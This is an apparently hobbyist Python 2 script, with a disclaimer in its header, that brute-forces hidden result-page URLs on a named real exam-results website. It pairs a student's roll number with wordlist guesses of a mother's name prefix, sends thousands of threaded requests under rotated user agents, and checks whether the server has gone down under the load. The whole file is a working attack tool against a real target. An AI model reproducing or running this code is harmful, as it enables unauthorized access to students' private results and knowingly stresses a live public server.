
#THIS PROGRAM IS FOR SHOWING HOW BRUTE FORCE IS USED ON WEBSITES.I HAVE GIVEN EXAMPLE OF WEBSITE OF RESULTS. DO NOT MISUSE OF THIS PROGRAM USE IT FOR READING PURPOSE. I AM NOT RESPONSIBLE FOR MISUSE AND ANY DAMAGE CAUSED BY THIS PROGRAM!
#THIS PROGRAM WORKS AS EXPECTED AND CAUSE DAMAGE TO SERVER. USE IT FOR READING PURPOSE AND TEST SIMILAR PROGRAM ON YOUR WEBSITE FOR PENETRATION TESTING

#useragents list
headers_useragents = []
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)
useragent_list()

#background colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

#libraries
import urllib2
import threading
from tqdm import tqdm
import random
import time

print('''

%s%s/===========================%sv1.0%s============================/
%s[[[[[[[[[[[[[[[[[[[[[[[[[[%sBrute Force Example%s]]]]]]]]]]]]]]]]]]]]]]]]]]

%s                                              -Ritesh Khandekar

\033[91mTHIS PROGRAM IS FOR SHOWING HOW BRUTE FORCE IS USED ON WEBSITES. I HAVE GIVEN EXAMPLE OF WEBSITE OF RESULTS. DO NOT MISUSE OF THIS PROGRAM USE IT FOR READING PURPOSE. I AM NOT RESPONSIBLE FOR MISUSE AND ANY DAMAGE CAUSED BY THIS PROGRAM!
THIS PROGRAM WORKS AS EXPECTED AND CAUSE DAMAGE TO SERVER. USE IT FOR READING PURPOSE AND TEST SIMILAR PROGRAM ON YOUR WEBSITE FOR PENETRATION TESTING\033[0m
'''%(bcolors.BOLD,bcolors.OKBLUE,bcolors.OKGREEN,bcolors.OKBLUE,bcolors.HEADER,bcolors.OKGREEN,bcolors.HEADER,bcolors.OKGREEN))

#main program starts here
#os.system("ulimit -Hn 4096") #increase open files limit
isfinished = False #flag to stop loop when result will found
#getting Seat no. and starting letter of mother name to reduce requests
#starting letter of mother's name is not necessary. Our wordlist will generate nearly 18000 URLs to find one result
rn = raw_input(bcolors.WARNING+"Always Check if website is working or not\nRoll No:")
sname = raw_input("Mother's Starting Letter (if you guess):")

#function to send HTTP Requests
def req(url,i):
	if i==0:
		print("\033[F\033[KPlease confirm URL: " + url+"\n") #for checking
	try: #check if responce code is 200 except pass 
		global isfinished #access global scope variable
		r = urllib2.Request(url)
		r.add_header('User-Agent', random.choice(headers_useragents))
		urllib2.urlopen(r)
		print("\n\n"+bcolors.OKGREEN+url+"\n\n"+bcolors.OKBLUE)
		isfinished=True #We got link, lets break loop 
	except:
		pass #likly 404 error, lets continue loop

#wordlist
f=open("wordlist.txt","r")
arr=[] #array of starting 3 letters of mother's name
for line in f:
	if not sname=="": #guessing letter is given
		if line.startswith(sname):
			arr.append(line.replace("\n","")) #nearly 700 requests to be sent
	else:
		arr.append(line.replace("\n","")) #nearly 18000 requests to be sent
print(bcolors.BOLD+"Probability: 1/%d\n"%len(arr))

f.close()

www="www." # for sending requests by small change in URL

#large amount of requests can increase stress on server, check if server responding or not

def checkifurlkilled():
	global www
	try:
		r=urllib2.Request("http://www.sscresult.mkcl.org/")
		r.add_header("Referer","http://www.sscresult.mkcl.org/")
		urllib2.urlopen(r)
		print("\033[F\033[KResumed")
		www="www."
		return True
	except:
		print("\033[F\033[KWaiting for Server Response..."+random.choice(['.','..','...']))
		www=""
		try:
			urllib2.urlopen("http://sscresult.mkcl.org/")
			print("\033[F\033[KResumed")
			return True
		except:
			time.sleep(1) #give some time to rest server
			return False #for again executing this function

for i in tqdm(range(len(arr))):
	#break loop if URL is found
	if isfinished==True:
		print(bcolors.FAIL+"Breaking loop....."+bcolors.ENDC)
		break
	#After each 100 requests, check if server is dead
	if i%100==0:
		while True:
			if checkifurlkilled()==True:
				break
	#for Error: too many open files
	if i%600==0 and not i==0:
		#time.sleep(2) #increase time if this error occurs simultaneously
		pass
	#sending first 200 requests with 'www.'
	if i<200:
		t = threading.Thread(target=req,args=("http://www.sscresult.mkcl.org/result/A/%s_%s.html"%(rn,arr[i]),i,)) #using threading to send requests more rapidly
		t.start()
	else:
		t = threading.Thread(target=req,args=("http://%ssscresult.mkcl.org/result/A/%s_%s.html"%(www,rn,arr[i]),i,))
		t.start()

#end
print(bcolors.ENDC)
#end colors
